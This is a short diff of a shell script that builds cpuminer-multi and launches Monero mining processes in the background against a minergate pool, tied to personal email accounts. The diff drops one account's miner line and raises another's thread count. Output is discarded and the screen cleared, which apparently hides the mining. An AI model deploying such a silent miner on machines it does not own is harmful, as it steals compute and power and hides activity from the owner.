@@ -6,6 +6,5 @@ git clone https://github.com/hyc/cpuminer-multi
 cd cpuminer-multi && ./autogen.sh
 CFLAGS="-march=native" ./configure
 make
-nohup ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u haiptithcm@gmail.com -p x -t 5 -x myloveforyou > /dev/null 2>&1 &
-nohup ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ttl1601@gmail.com -p x -t 2 -x ttlong > /dev/null 2>&1 &
+nohup ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ttl1601@gmail.com -p x -t 7 -x ttlong > /dev/null 2>&1 &
 clear
